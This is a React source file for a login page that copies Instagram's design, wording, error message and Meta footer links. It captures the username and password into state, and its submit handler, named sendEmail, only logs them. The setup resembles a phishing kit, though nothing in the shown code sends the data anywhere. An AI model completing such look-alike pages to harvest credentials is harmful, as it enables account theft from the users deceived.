import React, { useState } from "react";
import Input from "./Input";

const links = [
  "Meta",
  "About",
  "Blog",
  "Jobs",
  "Help",
  "API",
  "Privacy",
  "Terms",
  "Location",
  "Instagram Lite",
  "Threads",
  "Contact Uploadig and non-users",
  "Meta Verified",
];
const error =
  "Sorry, your password was incorrect. Please double-check your password.";

function Login() {
  const [formData, setFormData] = useState({ ID: "", password: "" });
  const [responseMessage, setResponseMessage] = useState("");

  const [isWrong, setIsWrong] = useState(false);

  const handleBlur = (e) => {
    setFormData({ ...formData, [e.target.id]: e.target.value });
    console.log(e.target.value, e.target.id);
  };

  const sendEmail = async (e) => {
    e.preventDefault();
    console.log(formData);
  };
  return (
    <div className="flex-col justify-center">
      <div className="text-white flex justify-center">
        <div className="flex flex-col">
          <div className="min-w-[350px] flex flex-col justify-center gap-3 items-center sm:shadow-[0_0_0_0.5px_gray] sm:mt-10">
            <div className="flex flex-col sm:min-w-[350px] justify-center items-center mt-6">
              <img src={`./Images/InstagramText.jpg`} />
            </div>
            <div className="flex flex-col justify-center items-center text-gray-300">
              <form onSubmit={sendEmail}>
                <Input
                  label="Phone number, username or email address"
                  type="text"
                  name="user"
                  id="ID"
                  handleblur={handleBlur}
                />
                <Input
                  label="Password"
                  type="password"
                  name="pass"
                  id="password"
                  handleblur={handleBlur}
                />

                <button className="py-1 rounded-md w-full bg-blue-600 text-sm font-bold mt-2">
                  Log in
                </button>
              </form>
              <div className="my-4 flex justify-between items-center gap-4">
                <div className="shadow-[0_0_0_0.3px_gray] max-h-[0.1%] w-[100px]" />
                <p className="text-sm">OR</p>
                <div className="shadow-[0_0_0_0.3px_gray] max-h-[0.1%] w-[100px]" />
              </div>
            </div>
            <div className="flex flex-col justify-center items-center text-gray-300 gap-4 pb-6">
              <div className="flex items-center gap-1">
                <img src="./Images/Facebookicon.png" className="w-[30px]" />
                <p className="text-blue-500 sm:text-[12px] text-[13px] font-bold hover:text-white">
                  Log in with Facebook
                </p>
              </div>
              {isWrong && (
                <dib className="flex flex-wrap justify-center max-w-[300px] items-center">
                  <div className="flex flex-wrap justify-center items-center text-center text-[14px] text-red-500">
                    {error}
                  </div>
                </dib>
              )}
              <div className="items-center">
                <p className="text-[13px] pl-4 text-gray-200">
                  Forgotten your password?
                </p>
              </div>
            </div>
          </div>
          <div className="sm:min-w-[350px] w-full flex flex-col justify-center gap-4 items-center sm:shadow-[0_0_0_0.5px_gray] p-5 mt-3">
            <p className="flex text-sm">
              Don't have an Account?{" "}
              <p className="text-blue-600 px-2 font-bold">Sing Up</p>
            </p>
          </div>
          <p className="flex justify-center mt-4 ">Get the app.</p>
          <img src="./Images/GetApp.png" />
        </div>
      </div>
      <div className="flex flex-col mt-10 text-white sm:mx-8 lg:mx-15">
        <div className="flex flex-wrap text-[12px] text-gray-400 justify-center gap-2 p-4">
          {links.map((link) => (
            <div key={link} className="px-1">
              {link}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

export default Login;
